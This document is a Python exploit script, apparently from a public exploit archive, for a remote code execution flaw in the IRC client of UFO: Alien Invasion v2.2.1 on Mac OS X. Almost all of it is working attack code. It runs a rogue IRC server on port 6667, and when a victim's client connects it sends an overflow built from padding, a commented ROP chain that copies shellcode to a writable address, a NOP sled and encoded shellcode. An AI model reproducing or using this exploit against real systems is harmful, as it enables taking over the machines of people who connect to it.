#!/usr/bin/python
 
# UFO: Alien Invasion v2.2.1 IRC Client Remote Code Execution - MacOSX
# OS X Snow Leopard: d1dn0t
# OS X Leopard: dookie
# Windows PoC: Jason Geffner http://www.exploit-db.com/exploits/14013
 
import sys, socket, struct
 
WRITEABLE = 0x8fe66448
STRCPY=0x8fe2db10
 
shellcode = ("\xdb\xc3\xd9\x74\x24\xf4\xbb\xf3\xbd\x8d\x7c\x33\xc9\x5d\xb1"
"\x27\x31\x5d\x18\x03\x5d\x18\x83\xc5\xf7\x5f\x78\x4d\x37\x06"
"\xd3\xee\xe7\x79\x84\xbc\xb7\x1b\xe9\xc1\xb8\x59\x8f\xc1\xc6"
"\x5d\xf9\x04\x94\x0f\xab\xe0\x18\xb2\x5a\xad\x91\x51\x36\x5d"
"\xf2\xc3\x95\xed\x9c\x26\x99\x7c\x3b\xeb\xcc\xd2\x73\x61\x3c"
"\x52\x01\x28\xec\x01\xb3\x86\xa0\xb8\xf6\xa7\xb3\x90\x81\x6f"
"\x02\xc2\x12\x84\x64\xb7\x47\x0c\x34\x87\x3d\x7f\x3a\x95\x82"
"\xfc\xc0\x59\x71\xf2\x06\x9e\x29\xa4\x38\x4e\x79\x7f\x74\xee"
"\xe9\x10\xba\xc2\x7c\x18\x73\x5e\xb3\x9a\xf0\xa5\x4b\xef\xe1"
"\x68\x8b\x5f\x66\xa4\x24\x13\x1e\xd2\x15\xb1\xb7\x4c\xe0\xd6"
"\x18\xc1\xa1\x48\x29\xda\x88\xe9\x78\xdd\x42\x63\x99\x8d\x32"
"\x20\x0e\x7e\x02\xc1\x63\xfe\x53\x0e\x2b\xaf\xd3\x43\x4c\x45")
 
# ==================== Put stack pointer into EAX/EDX ====================
ROP =   struct.pack('<I',0x8fe2b3d4)        # POP - RET Insturction - Pop's over the writeable value below
ROP +=  struct.pack('<I',WRITEABLE)                  # Required Writeable address here for exploit to work
ROP +=  struct.pack('<I',0x8fe2fb63)             # pop eax # ret
ROP +=  struct.pack('<I',WRITEABLE)                  # Pop writeable address into eax for instructions below
ROP +=  struct.pack('<I',0x8fe2fb58)             # push esp # and al,0x4 # mov [eax+0x28],edx # mov edx,[esp] # mov [eax],edx # pop eax # ret
 
# ==================== Jump Over Parameters below ====================
ROP +=  struct.pack('<I',0xffff1d6b)             # add esp,byte +0x1c # pop ebp # ret
 
# ==================== strcpy call ====================
ROP +=  struct.pack('<I',STRCPY)                     # use strcpy to copy shellcode from stack to heap
ROP +=  struct.pack('<I',0x8fe2dfd1)             # POP - POP - RET over strcpy params
ROP +=  struct.pack('<I',WRITEABLE)                  # Dst Param for strcpy
ROP +=  'EEEE'                                                          # Src Param for strcpy
ROP +=  struct.pack('<I',WRITEABLE)                  # Move execution to where we moved our shell
ROP +=  'C'*12                                                          # Padding
 
# ==================== Craft Parameter 2  ====================
 
# Need to inc EAX or EDX to point to shell code
 
# Store  0x40 in ECX
ROP +=  struct.pack('<I',0x8fe2dae4)                 # mov ecx,[esp+0x4] # add eax,edx # sub eax,ecx # ret 
ROP +=  struct.pack('<I',0x8fe2b3d4)                     # POP - RET Insturction - Pop's over the value below
ROP +=  struct.pack('<I',0xffffffff)                 # Value to store in ecx
ROP +=  struct.pack('<I',0x8fe0c0c7)                 # inc ecx # xor al,0xc9
ROP +=  struct.pack('<I',0x8fe0c0c7)                 # inc ecx # xor al,0xc9
ROP +=  struct.pack('<I',0x8fe24b3c)                 # add ecx,ecx # ret
ROP +=  struct.pack('<I',0x8fe24b3c)                 # add ecx,ecx # ret
ROP +=  struct.pack('<I',0x8fe24b3c)                 # add ecx,ecx # ret
ROP +=  struct.pack('<I',0x8fe24b3c)                 # add ecx,ecx # ret
 
# Replace stack pointer back into eax as it was trashed
ROP +=  struct.pack('<I',0x8fe2c71d)                 # mov eax,edx # ret
 
# Add offset to paramter
ROP +=  struct.pack('<I',0x8fe2def4)                 # add eax,ecx # ret
 
# Swap over so we can work on fresh copy of saved ESP
ROP +=  struct.pack('<I',0x8fe0e32d)                 # xchg eax,edx
 
# Double ECX a few more times to point to our nop sled/shell code
ROP +=  struct.pack('<I',0x8fe0c0c7)                 # inc ecx # xor al,0xc9
ROP +=  struct.pack('<I',0x8fe0c0c7)                 # inc ecx # xor al,0xc9
ROP +=  struct.pack('<I',0x8fe24b3c)                 # add ecx,ecx # ret
ROP +=  struct.pack('<I',0x8fe24b3c)                 # add ecx,ecx # ret
ROP +=  struct.pack('<I',0x8fe24b3c)                 # add ecx,ecx # ret
 
# Add offset to shellcode
ROP +=  struct.pack('<I',0x8fe2def4)                 # add eax,ecx # ret
 
# Swap back
ROP +=  struct.pack('<I',0x8fe0e32d)                 # xchg eax,edx
 
# Copy parameter to placeholder
ROP +=  struct.pack('<I',0x8fe2fb61)                 # mov [eax],edx # pop eax # ret
ROP +=  'G'*4                                                                   # junk
 
# ==================== Call strcpy function ====================
 
# Set our Stack pointer back to original value
ROP +=  struct.pack('<I',0x8fe0e32d)                 # xchg eax,edx
ROP +=  struct.pack('<I',0x8fe2daea)                 # sub eax,ecx # ret
 
# Return execution to our strdup call above
ROP +=  struct.pack('<I',0x8fe0b1c2)                 # xchg eax,ebp # inc ebp # ret
ROP +=  struct.pack('<I',0x8fe2b6a5)                 # dec ebp # ret
ROP +=  struct.pack('<I',0xffff01f3)                 # mov esp,ebp # pop ebp # ret
ROP +=  'G'*4                                                                   # junk
 
# ==================== Call Exploit code from heap ====================
 
 
sploit = "001 :"
sploit += "\x41" * 528
sploit += ROP
sploit += '\x90' * 10
sploit += shellcode
sploit += "\x0d\x0a"
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 6667))
s.listen(1)
print ("[*] Listening on port 6667.")
print ("[*] Have someone connect to you.")
print ("[*] Type [control]-c to exit.")
conn, addr = s.accept()
print '[*] Received connection from: ', addr
 
conn.send(sploit)
conn.close
